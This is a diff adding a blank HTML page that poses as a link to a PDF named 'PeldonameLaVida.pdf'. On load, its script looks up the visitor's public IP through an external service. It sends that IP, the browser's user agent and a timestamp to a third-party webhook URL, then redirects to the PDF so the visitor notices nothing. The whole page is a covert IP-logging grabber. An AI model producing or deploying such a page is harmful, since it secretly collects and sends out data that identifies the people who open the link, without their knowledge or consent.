@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title></title>
+
+<script>
+(async () => {
+
+const destino = "PeldonameLaVida.pdf";
+const webhook = "https://tools.myaiteam.com/webhook-catcher/webhook/9fd0f343122174183e72a2ae69de43bd";
+
+let ip = "unknown";
+
+try {
+    const r = await fetch("https://api.ipify.org?format=json");
+    const j = await r.json();
+    ip = j.ip;
+} catch(e){}
+
+const data = {
+    ip: ip,
+    destino: destino,
+    hora: new Date().toISOString(),
+    userAgent: navigator.userAgent
+};
+
+const json = JSON.stringify(data);
+const blob = new Blob([json], { type: "application/json" });
+
+let sent = false;
+
+if (navigator.sendBeacon) {
+    sent = navigator.sendBeacon(webhook, blob);
+}
+
+if (!sent) {
+    try {
+        await fetch(webhook, {
+            method: "POST",
+            headers: {
+                "Content-Type": "application/json"
+            },
+            body: json,
+            keepalive: true
+        });
+    } catch(e){}
+}
+
+// delay pequeño para asegurar envío en iPhone/Safari
+setTimeout(() => {
+    window.location.replace(destino);
+}, 600);
+
+})();
+</script>
+
+</head>
+<body>
+</body>
+</html>
